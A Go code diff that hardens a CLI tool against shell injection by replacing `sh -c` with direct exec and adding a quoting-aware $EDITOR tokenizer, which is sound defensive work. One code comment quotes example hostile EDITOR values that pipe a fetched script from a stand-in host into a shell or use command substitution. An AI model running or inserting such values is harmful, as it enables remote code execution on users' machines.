@@ -131,9 +131,13 @@ func Agent(args []string) error {
 		agentCmd = repoCfg.GetAgentCommand()
 	}
 
-	// Verify agent CLI exists
-	if _, err := exec.LookPath(agentCmd); err != nil {
-		return fmt.Errorf("agent CLI '%s' not found in PATH.\nInstall it or configure a different agent: ezs config set agent_command <command>", agentCmd)
+	// Verify agent CLI exists (check only the binary, not its args)
+	agentFields := strings.Fields(agentCmd)
+	if len(agentFields) == 0 {
+		return fmt.Errorf("agent_command is empty.\nConfigure one: ezs config set agent_command <command>")
+	}
+	if _, err := exec.LookPath(agentFields[0]); err != nil {
+		return fmt.Errorf("agent CLI '%s' not found in PATH.\nInstall it or configure a different agent: ezs config set agent_command <command>", agentFields[0])
 	}
 
 	// Agent requires worktree mode — each branch needs its own working directory
@@ -462,12 +466,71 @@ func resetRepoPrompt(promptType, repoPath string) error {
 }
 
 func openEditor(editor, filePath string) error {
-	// Use sh -c so that $EDITOR values like "code --wait" or "subl -w" work.
-	cmd := exec.Command("sh", "-c", editor+" "+ShellQuote(filePath))
+	// Parse $EDITOR as whitespace-separated tokens with basic quoting support,
+	// then invoke exec directly. Never go through `sh -c`: that would let
+	// EDITOR values like `vim; curl evil.sh | sh` or `$(id)` execute.
+	parts, err := splitEditorCommand(editor)
+	if err != nil {
+		return fmt.Errorf("parse $EDITOR (%q): %w", editor, err)
+	}
+	if len(parts) == 0 {
+		return fmt.Errorf("no editor configured")
+	}
+	parts = append(parts, filePath)
+	cmd := exec.Command(parts[0], parts[1:]...)
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	return cmd.Run()
+}
+
+// splitEditorCommand splits an EDITOR/VISUAL string into argv tokens with
+// minimal POSIX-style quoting: single quotes are literal, double quotes are
+// literal (no $ expansion since we never hand this to a shell), backslash
+// escapes the next character. Returns an error on unterminated quotes.
+func splitEditorCommand(s string) ([]string, error) {
+	var out []string
+	var cur strings.Builder
+	inSingle, inDouble, escaped, hasToken := false, false, false, false
+	flush := func() {
+		if hasToken {
+			out = append(out, cur.String())
+			cur.Reset()
+			hasToken = false
+		}
+	}
+	for i := 0; i < len(s); i++ {
+		c := s[i]
+		if escaped {
+			cur.WriteByte(c)
+			hasToken = true
+			escaped = false
+			continue
+		}
+		switch {
+		case c == '\\' && !inSingle:
+			escaped = true
+		case c == '\'' && !inDouble:
+			inSingle = !inSingle
+			hasToken = true
+		case c == '"' && !inSingle:
+			inDouble = !inDouble
+			hasToken = true
+		case (c == ' ' || c == '\t') && !inSingle && !inDouble:
+			flush()
+		default:
+			cur.WriteByte(c)
+			hasToken = true
+		}
+	}
+	if inSingle || inDouble {
+		return nil, fmt.Errorf("unterminated quote")
+	}
+	if escaped {
+		return nil, fmt.Errorf("trailing backslash")
+	}
+	flush()
+	return out, nil
 }
 
 // ── Prompt file management ─────────────────────────────────────────────────────
@@ -1020,7 +1083,12 @@ func expandHome(p string) string {
 // spawnAgentProcess launches the agent CLI with the rendered prompt.
 // The full prompt is passed as the first visible user message in the agent's UI.
 func spawnAgentProcess(agentCmd, workDir, prompt string) error {
-	cmd := exec.Command(agentCmd, prompt)
+	fields := strings.Fields(agentCmd)
+	if len(fields) == 0 {
+		return fmt.Errorf("agent_command is empty")
+	}
+	args := append(fields[1:], prompt)
+	cmd := exec.Command(fields[0], args...)
 	cmd.Dir = workDir
 	cmd.Stdin = os.Stdin
 	cmd.Stdout = os.Stdout
